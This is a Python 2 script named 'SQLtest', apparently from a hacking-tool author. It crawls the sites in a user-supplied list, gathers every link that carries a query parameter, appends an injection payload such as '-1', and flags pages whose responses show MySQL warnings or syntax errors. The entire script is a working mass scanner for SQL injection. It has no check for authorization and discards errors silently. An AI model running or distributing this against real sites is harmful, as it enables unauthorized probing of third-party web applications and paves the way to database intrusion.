#!/usr/bin/python
#SQLtest takes a list of sites and searches for links
#containing a "=". If an equal sign is found it adds 
#the SQL payload (-1, 999999) and checks source for Warning:

from sgmllib import SGMLParser
import sys, urllib, re, urllib2, sets

class URLLister(SGMLParser):
	def reset(self):
		SGMLParser.reset(self)
		self.urls = []

	def start_a(self, attrs):
		href = [v for k, v in attrs if k=='href']
		if href:
			self.urls.extend(href)
 
def test(host): 
	source = urllib2.urlopen(host+sys.argv[2]).read() 
	if re.search("Warning", source) != None: 
		print "\n\t[!] SQL:",host+sys.argv[2]
	if re.search("mysql_fetch_array()", source) != None:
		print "\t[!] Found: mysql_fetch_array() error\n"
	if re.search("You have an error in your SQL syntax", source) != None:
		print "\t[!] Found: sql syntax error\n"
		
		
print "\n\t   d3hydr8[at]gmail[dot]com SQLtest v1.2"
print "\t--------------------------------------------\n"
			
if len(sys.argv) != 3:
	print "Usage : ./sqltest.py <list of sites> <payload (-1, 999999)>"
	print "Eg: ./sqltest.py sites.txt \"-1\"\n"
	sys.exit(1)
	
try:
	sites = open(sys.argv[1], "r").readlines()
except(IOError): 
  	print "Error: Check your site list path\n"
  	sys.exit(1)
	
print "[+] Loaded:",len(sites),"sites"
print "[+] Payload:",sys.argv[2]

for site in sites:
	site = site.replace("\n","")
	if site.find("http://") != -1:
		site = site.replace("http://","")
		site = "http://"+site.rsplit("/",1)[0]
	if site.find("https://") != -1:
		site = site.replace("https://","")
		site = "https://"+site.rsplit("/",1)[0]
	print "\n[+] Collecting:",site
	try:
		usock = urllib.urlopen(site)
		parser = URLLister()
		parser.feed(usock.read())
		parser.close()
		usock.close()
		if len(parser.urls) >=1:
			urls2 = []
			for url in parser.urls: 
				if url.find("://") == -1:
					if url[0] == "/":
						url = site+url
					else:
						url = site+"/"+url
				if url.count("=") >= 2:
					for x in xrange(url.count("=")):
						urls2.append(url.rsplit("=",x+1)[0]+"=")
				if url.find("=") != -1:
					if url[0] == "/":
						urls2.append(site+url.split("=",1)[0]+"=")
					else:
						urls2.append(url.split("=",1)[0]+"=")
			urls2 = list(sets.Set(urls2))
			print "[+] Links Found:",len(urls2),"\n"
		else:
			urls2 = []
			print "[-] Error Connecting"
		for url in urls2:
			print "[+] Testing:",url+sys.argv[2]
			try:
				test(url)
			except:
				pass
	except:
		pass

print "\n[-] Done\n"
